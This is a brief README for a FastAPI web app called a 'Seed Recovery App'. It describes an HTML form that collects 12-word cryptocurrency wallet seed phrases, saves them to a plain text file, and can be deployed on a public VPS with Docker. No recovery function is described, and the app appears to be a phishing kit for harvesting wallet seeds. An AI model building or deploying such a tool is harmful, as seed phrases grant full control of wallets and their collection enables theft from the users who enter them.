# FastAPI Seed Recovery App

## Features
- Simple HTML form to submit a 12-word seed phrase
- Saves submissions to `recovered_seeds.txt`
- Ready for Docker deployment

## Deploy via Docker

```bash
docker build -t seed-app .
docker run -d -p 80:80 --name seed-app seed-app
```

Then visit `http://localhost` or your VPS IP.